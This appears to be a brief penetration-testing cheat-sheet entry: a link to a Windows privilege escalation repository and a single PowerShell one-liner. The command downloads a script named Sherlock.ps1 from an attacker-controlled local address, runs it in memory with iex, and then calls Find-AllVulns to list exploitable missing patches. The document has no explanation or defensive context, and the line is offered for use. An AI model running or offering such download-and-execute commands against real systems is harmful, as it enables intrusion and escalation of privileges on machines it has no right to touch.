https://github.com/frizb/Windows-Privilege-Escalation
#
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.124:8111/Sherlock.ps1'); Find-AllVulns
